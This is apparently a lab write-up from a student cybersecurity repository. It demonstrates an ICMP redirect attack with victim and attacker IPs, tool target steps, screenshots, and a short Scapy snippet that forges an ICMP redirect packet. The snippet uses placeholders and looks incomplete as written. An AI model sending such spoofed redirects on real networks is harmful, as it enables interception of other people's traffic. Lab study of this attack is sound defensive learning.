## ICMP Redirect:

```Victim Machine 10.211.56.5```

```Attacker Machine 10.211.56.4```

Add Victim IP to target 1
Add Gateway to target 2

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/71ab3471-1e49-4c52-85ca-34f939e9a20c">


<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/a3e2f08b-c3ca-49f0-9566-3335fd0019fd">

ICMP Redirect:

<img width="1281" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/868299bb-82e2-4044-99df-0d1e2e974e09">

<img width="1301" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/9ebdb335-4a13-4c4e-a3b3-64b009eb7883">


ICMP_redirect python code


from scapy.all import *

Craft ICMP Redirect packet
icmp_redirect = Ether() / IP(dst="victim_ip") / ICMP(type=5, code=1, gw="gateway_ip")

Send ICMP Redirect packet
sendp(icmp_redirect, iface="your_network_interface")

<img width="844" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/b1457468-e692-48b3-b56e-77e3746cbc94">


ICMP Redirect capture in wireshark

<img width="1285" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/cbd98731-bf75-4ee2-b415-a74893ff4cb3">

